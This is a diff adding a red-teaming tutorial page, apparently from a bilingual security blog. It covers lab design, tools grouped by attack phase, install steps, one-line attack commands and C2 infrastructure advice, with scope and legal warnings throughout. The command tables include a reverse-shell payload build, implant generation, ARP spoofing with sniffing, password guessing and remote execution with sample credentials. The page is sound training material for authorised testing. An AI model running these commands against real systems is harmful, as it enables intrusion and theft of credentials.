+          <tr><td>Web</td><td>DVWA plus one API of your own, behind the same proxy</td><td>sqlmap, ffuf, whatweb</td><td>One minimal request and response, no data dumped</td></tr>
+          <tr><td>CMS</td><td>A WordPress container, following the blog's own <a href="wordpress_attacks.html">WordPress</a> notes</td><td>WPScan, nuclei</td><td>Plugin version and advisory, never a defacement</td></tr>
+          <tr><td>Network</td><td>Two guests plus the sensor, one routed path between them</td><td>bettercap, Responder, tcpdump</td><td>Duplicate ARP, and an ARP table restored afterwards</td></tr>
+          <tr><td>Wireless</td><td>An access point you own, WPA2, a channel nobody else uses</td><td>airmon-ng, airodump-ng, hcxtools, hashcat</td><td>The hc22000 file and the recovered key; no deauth elsewhere</td></tr>
+          <tr><td>Active Directory</td><td>GOAD with a Kerberoastable user, an AS-REP account and unsigned SMB</td><td>impacket-GetUserSPNs, nxc, ntlmrelayx</td><td>A reference to the ticket, never the ticket itself</td></tr>
+          <tr><td>Cloud and code</td><td>A tenant you own, or a container with an exposed API</td><td>curl, the provider CLI</td><td>Listing output only — read access proves the point</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>
+      The web row is the one you can start today: <a href="phpLovers.html">PHP</a>,
+      <a href="dontBeLazy.html">applications</a> and <a href="httpProtocol.html">HTTP</a> explain what a
+      request actually does before you fuzz it, which is the difference between a finding and a screenshot.
+    </p>
+
+    <h3>9. Evidence, cleanup, reset</h3>
+    <pre><code>script -a ev/session-$(date +%F).log          <span class="c"># transcript from the first command</span>
+sha256sum ev/* &gt; ev/SHA256SUMS                <span class="c"># hash what you keep</span>
+sudo sliver-server   <span class="c"># then: sessions, kill &lt;id&gt;, and delete the implant from the lab</span>
+for d in dc01 ws01 kali; do virsh snapshot-revert $d clean; done</code></pre>
+    <div class="callout">
+      <h4>The drill is finished when the lab is clean</h4>
+      <p>
+        Revert the snapshots, kill the sessions, remove uploaded files and confirm the ARP table is normal
+        again. A lab that keeps yesterday's implant teaches you to leave persistence behind on a client — the
+        single most common red team finding in a retest.
+      </p>
+    </div>
+  </section>
+
+  <section id="tools">
+    <h2><span class="no">06</span> Tool map by phase</h2>
+    <p>
+      Tools are grouped by the question they answer, not by the menu they appear in on Kali. If two tools
+      sit in the same row, the note explains when each one wins.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Phase</th><th>Tool</th><th>What it proves</th></tr></thead>
+        <tbody>
+          <tr><td>Recon</td><td>nmap, amass, theHarvester</td><td>Which hosts and names exist, and which are reachable from where</td></tr>
+          <tr><td>Recon</td><td>BloodHound + collectors</td><td>The identity graph and the shortest path to the objective</td></tr>
+          <tr><td>Initial access</td><td>GoPhish, evilginx</td><td>Whether a realistic lure and a reverse proxy defeat MFA</td></tr>
+          <tr><td>Initial access</td><td>Impacket, NetExec</td><td>Whether exposed services accept the credentials you already hold</td></tr>
+          <tr><td>Execution</td><td>Sliver, Mythic, Havoc, Cobalt Strike</td><td>Command and control over a realistic channel with logs</td></tr>
+          <tr><td>Persistence</td><td>LOLBins, scheduled tasks, systemd units</td><td>Whether a foothold survives reboot and survives review</td></tr>
+          <tr><td>Privilege</td><td>PEASS-ng, Seatbelt, Rubeus</td><td>Which misconfiguration turns a user into an administrator</td></tr>
+          <tr><td>Credentials</td><td>Mimikatz, secretsdump, Kerberoast</td><td>Whether the credential estate is stronger than the perimeter</td></tr>
+          <tr><td>Lateral</td><td>NetExec, wmiexec, chisel, ligolo-ng</td><td>How far one identity reaches, and through which artefact</td></tr>
+          <tr><td>Collection</td><td>Share enumeration, database clients</td><td>Whether the objective data is reachable, not how much of it exists</td></tr>
+          <tr><td>Exfiltration</td><td>rclone, DNS/HTTPS channels</td><td>Whether egress control works — with a minimum, hashed sample</td></tr>
+          <tr><td>Impact</td><td>Documented, reversible demonstrations</td><td>Business consequence, without causing it</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="callout note">
+      <h4>Stop at proof</h4>
+      <p>
+        A red team that dumps the customer database has produced a data breach, not a finding. Take the
+        smallest artefact that demonstrates access, hash it, encrypt it, and explain in the report what you
+        did <em>not</em> touch. The same rule applies to persistence: remove it, and record the removal.
+      </p>
+    </div>
+    <p>
+      Tool-level detail for most of this table lives in the <a href="KaliLinux.html">Kali</a> manual, and
+      the exploitation half specifically in <a href="metasploit.html">Metasploit</a>.
+    </p>
+  </section>
+
+  <section id="setup">
+    <h2><span class="no">07</span> Setup: installing every tool on this page</h2>
+    <p>
+      Package names below are Kali rolling and Debian. The rule that saves hours: <b>apt first</b> (packaged,
+      updated with the system), <b>pipx second</b> (one virtual environment per Python tool), <b>releases
+      third</b> (a pinned archive you can hash). Never mix a third-party repository into a rolling system to
+      get one tool, and never pipe a remote installer into a root shell.
+    </p>
+
+    <h3>The attacker box in one pass</h3>
+    <pre><code>sudo apt update
+sudo apt install -y nmap masscan arp-scan amass theharvester \
+  ffuf feroxbuster gobuster whatweb nikto sqlmap wpscan nuclei \
+  hydra hashcat john cewl crunch responder bettercap ettercap-text-only \
+  tcpdump tshark mitmproxy aircrack-ng hcxtools kismet \
+  metasploit-framework exploitdb python3-impacket netexec evil-winrm \
+  bloodhound neo4j sliver docker.io git golang-go
+
+<span class="c"># one virtual environment per Python tool, no global pip</span>
+pipx install bloodhound      <span class="c"># BloodHound.py collector</span>
+pipx install impacket        <span class="c"># if you want newer scripts than apt ships</span>
+
+<span class="c"># every binary answers, or you fix it now rather than mid-engagement</span>
+for t in nmap masscan ffuf feroxbuster sqlmap hydra hashcat responder \
+         bettercap tcpdump tshark mitmproxy aircrack-ng hcxtools msfconsole nxc; do
+  printf '%-14s %s\n' "$t" "$(command -v "$t" || echo MISSING)"
+done</code></pre>
+
+    <h3>What each tool needs before it works</h3>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Tool</th><th>Install</th><th>First-run step</th></tr></thead>
+        <tbody>
+          <tr><td>nmap</td><td><code>apt install nmap</code></td><td>Nothing; add NSE scripts with <code>nmap --script-updatedb</code></td></tr>
+          <tr><td>masscan</td><td><code>apt install masscan</code></td><td>Needs <code>--rate</code> you can justify and a source IP you own</td></tr>
+          <tr><td>amass</td><td><code>apt install amass</code></td><td><code>amass enum -passive -d example.org</code>; API keys optional, in <code>~/.config/amass/</code></td></tr>
+          <tr><td>theHarvester</td><td><code>apt install theharvester</code></td><td>Works offline from public sources; add keys to <code>api-keys.yaml</code> for depth</td></tr>
+          <tr><td>ffuf, feroxbuster, gobuster</td><td><code>apt install ffuf feroxbuster gobuster</code></td><td>Install wordlists: <code>apt install seclists</code>, then <code>/usr/share/seclists/</code></td></tr>
+          <tr><td>whatweb, nikto, wpscan, nuclei</td><td><code>apt install whatweb nikto wpscan nuclei</code></td><td><code>nuclei -update-templates</code>; WPScan wants a free API token for vulnerability data</td></tr>
+          <tr><td>sqlmap</td><td><code>apt install sqlmap</code></td><td>Start at <code>--level 2 --risk 1</code>; read the injection point before automating it</td></tr>
+          <tr><td>hydra</td><td><code>apt install hydra</code></td><td>Check the lockout policy first; <code>-t 4</code> is a production-safe ceiling</td></tr>
+          <tr><td>hashcat, john</td><td><code>apt install hashcat john</code></td><td><code>hashcat -I</code> to list devices; <code>/usr/share/wordlists/rockyou.txt.gz</code> must be unpacked</td></tr>
+          <tr><td>cewl, crunch</td><td><code>apt install cewl crunch</code></td><td>Generate, then sort by likelihood; a huge list hides the good candidate</td></tr>
+          <tr><td>Responder</td><td><code>apt install responder</code></td><td><code>responder -I eth0 -A</code> first (analyse), then poisoning only in scope</td></tr>
+          <tr><td>bettercap, ettercap</td><td><code>apt install bettercap ettercap-text-only</code></td><td><code>sudo sysctl -w net.ipv4.ip_forward=1</code>; restore it afterwards</td></tr>
+          <tr><td>tcpdump, tshark, mitmproxy</td><td><code>apt install tcpdump tshark mitmproxy</code></td><td>tshark needs the <code>wireshark</code> group or root; mitmproxy's CA must be trusted by the client</td></tr>
+          <tr><td>aircrack-ng, hcxtools, kismet</td><td><code>apt install aircrack-ng hcxtools kismet</code></td><td>Adapter with monitor mode; <code>airmon-ng check kill</code> before <code>airmon-ng start wlan0</code></td></tr>
+          <tr><td>Metasploit, searchsploit</td><td><code>apt install metasploit-framework exploitdb</code></td><td><code>sudo msfdb init</code> once; <code>searchsploit -u</code> to refresh the archive</td></tr>
+          <tr><td>Impacket, NetExec, Evil-WinRM</td><td><code>apt install python3-impacket netexec evil-winrm</code></td><td>Impacket scripts are prefixed <code>impacket-</code>; <code>nxc</code> is the NetExec binary</td></tr>
+          <tr><td>BloodHound</td><td><code>apt install bloodhound neo4j</code></td><td><code>sudo neo4j console</code>, change the default password, then <code>bloodhound</code>; collect with <code>pipx install bloodhound</code> → <code>bloodhound-python</code></td></tr>
+          <tr><td>Sliver</td><td><code>apt install sliver</code></td><td><code>sliver-server</code> then <code>mtls --lhost 10.66.0.50 --lport 8888</code>; keep it lab-only</td></tr>
+          <tr><td>Mythic, Havoc</td><td>GitHub releases, Docker</td><td>Mythic: <code>./install_docker.sh &amp;&amp; ./mythic-cli start</code></td></tr>
+          <tr><td>GoPhish, evilginx</td><td>GitHub releases / <code>go build</code></td><td>GoPhish serves admin on 3333 and the lure on 80/443; use a domain you own</td></tr>
+          <tr><td>PEASS-ng, Seatbelt, Rubeus, Mimikatz</td><td>GitHub releases</td><td>Run on the lab host only; hash what you download and keep the version</td></tr>
+          <tr><td>Atomic Red Team, Caldera, GOAD</td><td>git clone</td><td>Atomic: <code>Invoke-AtomicTest T1059.001 -CheckPrereqs</code>; Caldera: <code>python server.py --insecure</code>; GOAD: <code>./goad.sh -t install</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>How to use them, by purpose</h3>
+    <p>
+      One command per purpose, in the order an engagement meets them. Each line is the smallest form that
+      still produces evidence; the full workflow lives in the <a href="KaliLinux.html">Kali</a> manual and,
+      for the exploitation half, in the <a href="metasploit.html">Metasploit</a> manual on this blog.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Purpose</th><th>Command</th><th>What you get</th></tr></thead>
+        <tbody>
+          <tr><td>Find live hosts</td><td><code>nmap -sn 10.66.10.0/24 -oA ev/disc</code></td><td>A host list, saved, with timestamps</td></tr>
+          <tr><td>Identify services</td><td><code>nmap -sCV -p- --min-rate 1000 -oA ev/svc 10.66.10.50</code></td><td>Versions you can match to an advisory</td></tr>
+          <tr><td>Find content</td><td><code>feroxbuster -u http://10.66.10.50 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 20 -o ev/dirs.txt</code></td><td>Paths, each verified by hand</td></tr>
+          <tr><td>Fuzz one parameter</td><td><code>ffuf -u 'http://10.66.10.50/item?q=FUZZ' -w params.txt -mc 200</code></td><td>Response differences worth a second look</td></tr>
+          <tr><td>Prove injection</td><td><code>sqlmap -r req.txt --level 2 --risk 1 --batch --dbs</code></td><td>Database names, read-only</td></tr>
+          <tr><td>Fingerprint a CMS</td><td><code>whatweb -a 3 http://10.66.10.50</code> then <code>wpscan --url http://10.66.10.50 --enumerate vp</code></td><td>Platform and plugin versions</td></tr>
+          <tr><td>Test credentials online</td><td><code>hydra -L users.txt -P pass.txt -t 4 -f ssh://10.66.10.20</code></td><td>One valid pair, then stop</td></tr>
+          <tr><td>Crack offline</td><td><code>hashcat -m 22000 ev/cap.hc22000 /usr/share/wordlists/rockyou.txt</code></td><td>The key, or a defended key</td></tr>
+          <tr><td>Map AD</td><td><code>bloodhound-python -c DCOnly --zip</code>, then <code>sudo neo4j console</code> and <code>bloodhound</code></td><td>The shortest path to the objective</td></tr>
+          <tr><td>Validate access</td><td><code>nxc smb 10.66.10.0/24 -u bob -p 'Passw0rd!' -d LAB --shares --sessions</code></td><td>Where that identity actually works</td></tr>
+          <tr><td>Execute one command</td><td><code>impacket-wmiexec LAB/bob:'Passw0rd!'@10.66.10.20 whoami</code></td><td>Proof of execution, nothing more</td></tr>
+          <tr><td>Exploit</td><td><code>msfconsole -q</code> → <code>search</code> → <code>use</code> → <code>set RHOSTS</code> → <code>check</code> → <code>run</code></td><td>A session, after <code>check</code> says it is safe</td></tr>
+          <tr><td>Build a payload</td><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.66.0.50 LPORT=4444 -f exe -o ev/imp.exe</code></td><td>A payload and the handler that matches it</td></tr>
+          <tr><td>Hold a channel</td><td><code>sliver-server</code> → <code>mtls --lhost 10.66.0.50 --lport 8888</code> → <code>generate --mtls 10.66.0.50:8888 --os windows</code></td><td>A session and a server-side log</td></tr>
+          <tr><td>Capture traffic</td><td><code>tcpdump -i eth0 -nn -s0 -w ev/cap.pcap 'tcp port 80'</code> then <code>tshark -r ev/cap.pcap -Y http.request</code></td><td>Evidence you can replay later</td></tr>
+          <tr><td>Intercept a session</td><td><code>bettercap -iface eth0</code> → <code>net.probe on</code> → <code>arp.spoof on</code> → <code>net.sniff on</code></td><td>Cleartext credentials, and a network to restore</td></tr>
+          <tr><td>Test wireless</td><td><code>airmon-ng start wlan0</code> → <code>airodump-ng -w ev/cap wlan0mon</code> → <code>hcxpcapngtool -o ev/cap.hc22000 ev/cap.pcapng</code></td><td>A handshake file, ready for hashcat</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>
+      Metasploit deserves its own paragraph because it is a workflow, not a command: initialise the database,
+      search by module type and platform, always run <code>check</code> before <code>run</code>, and keep the
+      session list. The <a href="metasploit.html">manual</a> covers the database, module anatomy,
+      payload selection and sessions in depth; the block below is only the shape of a safe first pass.
+    </p>
+    <pre><code>sudo msfdb init &amp;&amp; msfconsole -q
+msf6 &gt; db_status
+msf6 &gt; search type:auxiliary name:smb
+msf6 &gt; use auxiliary/scanner/smb/smb_version
+msf6 &gt; set RHOSTS 10.66.10.0/24
+msf6 &gt; run
+msf6 &gt; use exploit/... &amp;&amp; set RHOSTS 10.66.10.20
+msf6 &gt; check          <span class="c"># vulnerable? then, and only then:</span>
+msf6 &gt; run
+msf6 &gt; sessions -l &amp;&amp; sessions -k 1</code></pre>
+
+    <div class="callout">
+      <h4>Three of these cannot be installed</h4>
+      <p>
+        Cobalt Strike, Brute Ratel and Burp Suite Pro are licensed products: you buy a seat, you do not
+        <code>apt install</code> them, and the licence usually forbids sharing the artefact. Everything else on
+        this page is open source or already packaged — which is why a lab can be rebuilt from a script and a
+        paid tool cannot.
+      </p>
+    </div>
+    <p>
+      Before any of this reaches a target, re-read the scope. The <a href="KaliLinux.html">Kali</a> manual has
+      the legal baseline, and <a href="EthicalLawsOnIT.html">Ethics</a> explains why the setup is the easy
+      part.
+    </p>
+  </section>
+
+  <section id="infra">
+    <h2><span class="no">08</span> C2, redirectors and OPSEC</h2>
+    <p>
+      Infrastructure is where amateur engagements are detected first — before a single payload runs. The
+      pattern that works is boring: a stable team server that only your operators can reach, one or more
+      redirectors between it and the target, short-lived domains registered with a real registrar, and
+      profiles that look like the traffic around them.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Decision</th><th>Conservative choice</th><th>Trade-off</th></tr></thead>
+        <tbody>
+          <tr><td>Channel</td><td>HTTPS with a domain fronted by a CDN you own</td><td>Slower, but blends with normal egress</td></tr>
+          <tr><td>Beacon</td><td>Long sleep, jitter above 30%, no interactive shell unless needed</td><td>Patience for safety</td></tr>
+          <tr><td>Redirector</td><td>Separate host, IP allow-list to the team server</td><td>One more thing to rebuild mid-engagement</td></tr>
+          <tr><td>Domains</td><td>Aged, categorised, with SPF/DKIM/DMARC set</td><td>Cost and lead time before the window opens</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <h3>OPSEC is a checklist, not a vibe</h3>
+    <ul>
+      <li><b>Separate identities.</b> A dedicated operator account, browser profile and VM per engagement, never your personal logins.</li>
+      <li><b>Assume telemetry.</b> Every command you run may be logged by EDR, DNS or proxy. Design the payload to prove the point, not to avoid all logging.</li>
+      <li><b>Timebox activity.</b> Business hours in the target's timezone; an out-of-hours shell is itself a detection.</li>
+      <li><b>Kill your own infrastructure</b> at the end and keep the logs. <code>journalctl</code> on the team server is evidence too.</li>
+      <li><b>Do not reuse tooling across clients.</b> A malware hash in a public sandbox links engagements you promised to separate.</li>
+    </ul>
+  </section>
+
+  <section id="emulation">
+    <h2><span class="no">09</span> Emulation frameworks</h2>
+    <p>
+      Once the lab exists, automation turns ad-hoc tests into coverage data. Atomic tests are the fastest
+      way to exercise a single technique; Caldera chains abilities into an operation; VECTR records what
+      was run and whether it was detected.
+    </p>
+    <pre><code><span class="c"># run one technique and see exactly what the endpoint should log</span>
+git clone https://github.com/redcanaryco/atomic-red-team
+pwsh -c "Import-Module ./atomic-red-team/atomics/Invoke-AtomicRedTeam.psd1; \
+  Invoke-AtomicTest T1059.001 -TestNumbers 1 -CheckPrereqs"
+
+<span class="c"># a Caldera agent inside the lab only</span>
+caldera --insecure --build
+
+<span class="c"># log the emulation plan before you run it</span>
+echo "actor,technique,expected telemetry,detected(y/n)" &gt; lab/emulation.csv</code></pre>
+    <p>
+      The useful deliverable of emulation is a matrix, not a shell: technique, expected artefact, whether it
+      appeared, and how long before someone looked. Hand it to the blue team as the <em>input</em> to
+      detection engineering rather than as a scoreboard.
+    </p>
+  </section>
+
+  <section id="handoff">
+    <h2><span class="no">10</span> Purple handoff and reporting</h2>
+    <p>
+      A red team that leaves only a PDF has wasted the engagement. The debrief should transfer
+      understanding: which techniques were invisible, which alerts fired but were never triaged, and which
+      controls were simply not deployed.
+    </p>
+    <ol>
+      <li><b>Timeline.</b> Every action with a timestamp, mapped to ATT&amp;CK, and the detection state at that moment.</li>
+      <li><b>Objective.</b> Reached or not; if not, which control stopped it and what it would have cost to bypass.</li>
+      <li><b>Evidence.</b> Hashed artefacts, command transcripts, screenshots with tokens redacted.</li>
+      <li><b>Gaps.</b> Ranked by effort to detect versus value of detecting, not by how loud the technique was.</li>
+      <li><b>Cleanup.</b> Accounts, persistence, uploaded files, changed policy — with proof of removal.</li>
+      <li><b>Retest criteria.</b> What "fixed" means for each finding, agreed before they start fixing.</li>
+    </ol>
+    <div class="callout">
+      <h4>Report the detections, not only the shells</h4>
+      <p>
+        The sentence that changes a client's security is "we were in your finance share for six days and no
+        alert fired", not "we obtained administrator". Write the narrative a defender can replay in their own
+        data, and name the log source that should have caught each step.
+      </p>
+    </div>
+    <div class="next">
+      <a href="BlueTeams.html">Defenders</a>
+      <a href="EthicalLawsOnIT.html">Ethics</a>
+      <a href="Security.html">Intrusions</a>
+    </div>
+  </section>
+
+  <section id="sources">
+    <h2><span class="no">11</span> Sources and further reading</h2>
+    <h3>Doctrine and frameworks</h3>
+    <ul>
+      <li><a href="https://attack.mitre.org/">ATT&amp;CK</a> — tactics, techniques and software used by real groups.</li>
+      <li><a href="https://github.com/center-for-threat-informed-defense/adversary_emulation_library">Emulation</a> — MITRE Engenuity's per-actor emulation plans.</li>
+      <li><a href="https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf">TIBER</a> — EU framework for intelligence-led red teaming.</li>
+      <li><a href="https://www.bankofengland.co.uk/financial-stability/financial-sector-continuity/cbest">CBEST</a> — the UK supervisory equivalent.</li>
+      <li><a href="https://www.pentest-standard.org/index.php/Main_Page">PTES</a> — the phase model behind most reports.</li>
+      <li><a href="https://csrc.nist.gov/pubs/sp/800/115/final">NIST</a> — SP 800-115, technical security testing.</li>
+    </ul>
+    <h3>Labs and tooling</h3>
+    <ul>
+      <li><a href="https://github.com/Orange-Cyberdefense/GOAD">GOAD</a> — a deliberately vulnerable Active Directory lab.</li>
+      <li><a href="https://github.com/davidprowe/BadBlood">BadBlood</a> — fills a test domain with realistic objects.</li>
+      <li><a href="https://github.com/redcanaryco/atomic-red-team">Atomic</a> — one test per technique, with cleanup.</li>
+      <li><a href="https://github.com/mitre/caldera">Caldera</a> — automated adversary emulation server.</li>
+      <li><a href="https://github.com/BishopFox/sliver">Sliver</a> and <a href="https://github.com/its-a-feature/Mythic">Mythic</a> — open C2 frameworks for lab work.</li>
+      <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a> and <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> — Kerberos and credential techniques, lab only.</li>
+    </ul>
+    <h3>From this blog</h3>
+    <ul>
+      <li><a href="KaliLinux.html">Kali</a>, <a href="metasploit.html">Metasploit</a> and <a href="Suricata.html">Suricata</a> for the tool-level detail.</li>
+      <li><a href="pentestingSociety.html">Society</a> and <a href="EthicalLawsOnIT.html">Ethics</a> for why the scope matters more than the flags.</li>
+    </ul>
+    <div class="callout law">
+      <h4>Capability is not permission</h4>
+      <p>
+        Unauthorised access, interception and modification are criminal offences in most jurisdictions,
+        including Portugal (<i>Lei do Cibercrime</i>, Lei n.&ordm; 109/2009) and Brazil (Lei n.&ordm;
+        12.737/2012). Nothing on this page authorises anything; a signed contract does, and only within its
+        scope.
+      </p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><b>Red Teams</b> &middot; adversary emulation, labs and doctrine &middot; part of the Security &amp; Hacking manual set.</p>
+    <p>Vanilla HTML, CSS3 and JavaScript. No external styles, scripts, fonts or images.</p>
+    <a class="home" href="./index.html">Home</a>
+  </div>
+</footer>
+</div>
+
+<div id="lang-pt" data-lang-block="pt" hidden>
+<header class="topbar">
+  <div class="wrap" style="display:flex;align-items:center;gap:.8rem;flex:1">
+    <a class="home" href="./index.html">Início</a>
+    <span class="brand">Red <b>/</b> Teams</span>
+  </div>
+</header>
+
+<main class="wrap">
+  <div class="hero">
+    <p class="kicker">Emulação de adversário &middot; doutrina, laboratório, ferramentas</p>
+    <h2 class="seo-h2">Red Teams: emular um adversário, não correr um scanner</h2>
+    <p class="lede">
+      Uma red team mede-se pelo objetivo que alcança e pela evidência que deixa, não pelo número de alertas
+      que gera. Esta página é a metade prática dessa ideia: como se define o âmbito, que <b>documentos</b>
+      sustentam a doutrina, como construir um <b>laboratório</b> que se pode destruir sem queimar um cliente,
+      e que <b>ferramentas</b> respondem a que pergunta em cada fase.
+    </p>
+    <div class="meta-line">
+      <span class="chip">apenas alvos autorizados</span>
+      <span class="chip dim">12 grupos de ferramentas</span>
+      <span class="chip dim">5 componentes de laboratório</span>
+      <span class="chip dim">6 doutrinas</span>
+    </div>
+  </div>
+
+  <nav class="toc" aria-labelledby="pt-toc-title">
+    <h2 id="pt-toc-title">Índice</h2>
+    <ol>
+      <li><a href="#pt-what"><span>01</span> Red team, pentest, scan</a></li>
+      <li><a href="#pt-scope"><span>02</span> Âmbito e regras de envolvimento</a></li>
+      <li><a href="#pt-doctrine"><span>03</span> Os documentos que definem o trabalho</a></li>
+      <li><a href="#pt-lab"><span>04</span> Construir um laboratório de ataque</a></li>
+      <li><a href="#pt-walkthrough"><span>05</span> Passo a passo: do zero ao hacking</a></li>
+      <li><a href="#pt-tools"><span>06</span> Mapa de ferramentas por fase</a></li>
+      <li><a href="#pt-setup"><span>07</span> Instalação: cada ferramenta</a></li>
+      <li><a href="#pt-infra"><span>08</span> C2, redirecionadores e OPSEC</a></li>
+      <li><a href="#pt-emulation"><span>09</span> Plataformas de emulação</a></li>
+      <li><a href="#pt-handoff"><span>10</span> Entrega à equipa azul e relatório</a></li>
+      <li><a href="#pt-sources"><span>11</span> Fontes e leitura recomendada</a></li>
+    </ol>
+  </nav>
+
+  <section id="pt-what">
+    <h2><span class="no">01</span> Red team, pentest, scan</h2>
+    <p>
+      As palavras são trocadas em propostas comerciais e é aí que começa a maior parte das desilusões. Um
+      scanner de vulnerabilidades enumera; um teste de intrusão prova um achado numa lista de ativos
+      acordada; uma red team recebe um <b>objetivo</b> — uma base de dados concreta, administração de
+      domínio, uma alteração em produção — e é avaliada por lá chegar, ou não, sem ser detetada durante um
+      período combinado.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Envolvimento</th><th>Pergunta a que responde</th><th>Sucesso é</th><th>Forma típica</th></tr></thead>
+        <tbody>
+          <tr><td>Avaliação de vulnerabilidades</td><td>O que está desatualizado ou mal configurado?</td><td>Uma lista priorizada com evidência</td><td>Dias, orientada a ferramenta, ampla</td></tr>
+          <tr><td>Teste de intrusão</td><td>Estes achados concretos são exploráveis?</td><td>Prova por achado, com remediação</td><td>Uma a três semanas, lista de ativos</td></tr>
+          <tr><td>Red team</td><td>Um adversário realista chega ao objetivo?</td><td>Objetivo alcançado e cronologia de deteção</td><td>Semanas, foco em furtividade, poucos alvos</td></tr>
+          <tr><td>Emulação de adversário</td><td>As nossas deteções apanham este ator conhecido?</td><td>Mapa de cobertura de técnicas, não uma intrusão</td><td>Dias, orientada a TTP, instrumentada</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>
+      A emulação é a mais rigorosa e a mais útil das quatro: escolhe-se um ator que realmente ataca o setor,
+      repetem-se as suas técnicas por ordem e mede-se o que os defensores viram. A diferença entre
+      «chegámos a administrador de domínio» e «chegámos a administrador de domínio em 40 minutos e ninguém
+      notou» é o entregável inteiro.
+    </p>
+  </section>
+
+  <section id="pt-scope">
+    <h2><span class="no">02</span> Âmbito e regras de envolvimento</h2>
+    <p>
+      Tudo abaixo pressupõe um âmbito assinado, um contacto de desconflito e uma condição de paragem. Sem
+      esses três elementos, os mesmos comandos são crime — capacidade não é permissão. O
+      <a href="KaliLinux.html">manual</a> detalha a base legal; aqui fica a versão operacional usada para
+      escrever as regras de uma red team.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Campo</th><th>O que tem de dizer</th><th>Como as red teams falham</th></tr></thead>
+        <tbody>
+          <tr><td>Objetivo</td><td>O ativo, conta ou resultado que conta como sucesso</td><td>«Entrar de alguma forma» produz relatório infalsificável</td></tr>
+          <tr><td>Alvos</td><td>Domínios, IPs, tenants, escritórios e pessoas em âmbito, mais exclusões</td><td>SaaS de terceiros e regiões cloud entram sem ninguém notar</td></tr>
+          <tr><td>Técnicas</td><td>Ações permitidas, desencorajadas e proibidas, por nome</td><td>Ninguém escreveu «sem engenharia social»</td></tr>
+          <tr><td>Desconflito</td><td>Quem sabe, como é contactado, como se prova que o teste é genuíno</td><td>A equipa azul escala um incidente real a meio do trabalho</td></tr>
+          <tr><td>Paragem</td><td>Condições que terminam o teste e quem as pode invocar</td><td>Interrupções de serviço não têm travão acordado</td></tr>
+          <tr><td>Dados</td><td>O que pode ser levado, onde fica, quando é destruído</td><td>Registos de clientes acabam numa pasta de capturas de ecrã</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="callout law">
+      <h4>A carta de autorização escreve-se antes do primeiro pacote</h4>
+      <p>
+        A autorização deve nomear os testadores, as datas, os ativos, as técnicas permitidas e um contacto
+        capaz de confirmar o trabalho a qualquer hora. Se um operador for interpelado pelo responsável do
+        sistema às duas da manhã, esse documento é a diferença entre um incidente e um telefonema. Guarde-o
+        offline e no telefone.
+      </p>
+    </div>
+  </section>
+
+  <section id="pt-doctrine">
+    <h2><span class="no">03</span> Os documentos que definem o trabalho</h2>
+    <p>
+      O red teaming tem literatura. Ler uma vez transforma improviso em método repetível, e é isso que
+      separa um relatório acionável de uma parede de capturas de ecrã.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Documento</th><th>Autor</th><th>O que se retira</th></tr></thead>
+        <tbody>
+          <tr><td>ATT&amp;CK</td><td>MITRE</td><td>O vocabulário de táticas e técnicas a que cada achado se mapeia</td></tr>
+          <tr><td>Emulation Library</td><td>MITRE Engenuity</td><td>Planos de emulação prontos por grupo de ameaça</td></tr>
+          <tr><td>TIBER-EU</td><td>Banco Central Europeu</td><td>Red teaming guiado por informação de ameaças, para finanças</td></tr>
+          <tr><td>CBEST</td><td>Bank of England</td><td>A mesma ideia com reporte supervisivo no Reino Unido</td></tr>
+          <tr><td>PTES</td><td>Projeto PTES</td><td>A estrutura de fases que o relatório deve seguir</td></tr>
+          <tr><td>SP 800-115</td><td>NIST</td><td>Método de teste de intrusão e orientação sobre evidência</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>
+      Para a metade defensiva do mesmo vocabulário, ver <a href="learnHacking.html">laboratório</a>. O
+      ATT&amp;CK é também a ponte para os relatórios sobre <a href="apt.html">APT</a>: um perfil de ator sem
+      identificadores de técnica é folclore, e uma técnica sem telemetria não é testável.
+    </p>
+  </section>
+
+  <section id="pt-lab">
+    <h2><span class="no">04</span> Construir um laboratório de ataque</h2>
+    <p>
+      Ensaie em sistemas que não podem chamar um advogado. O laboratório abaixo é pequeno de propósito: um
+      hipervisor, três redes isoladas, um domínio Windows para atacar, um Linux para pivotar e um servidor
+      C2 que só o laboratório alcança. Tudo tem snapshot, porque um laboratório que não reverte ensina a
+      lição errada sobre persistência.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Camada</th><th>Construção</th><th>Objetivo</th><th>Reposição</th></tr></thead>
+        <tbody>
+          <tr><td>Hipervisor</td><td>Proxmox VE, ou VirtualBox/VMware num host dedicado</td><td>Snapshots, clonagem, isolamento de rede</td><td>Reconstrução semanal</td></tr>
+          <tr><td>Rede de ataque</td><td>10.66.0.0/24, sem rota NAT para a internet</td><td>Kali, C2, VM redirecionadora</td><td>Reverter o C2 após cada exercício</td></tr>
+          <tr><td>Rede alvo</td><td>10.66.10.0/24, firewall entre as duas</td><td>DC, postos de trabalho, servidor Linux, apps vulneráveis</td><td>Snapshot por exercício</td></tr>
+          <tr><td>Domínio</td><td>Windows Server DC e dois clientes, política fraca mas realista</td><td>Kerberos, SMB, GPO, erros de administração em camadas</td><td>Reconstrução com Ansible/GOAD</td></tr>
+          <tr><td>Alvos</td><td>DVWA, Juice Shop, Metasploitable, um AP antigo seu</td><td>Prática web, de rede e sem fios</td><td>Recriar o contentor</td></tr>
+        </tbody>
+      </table>
+    </div>
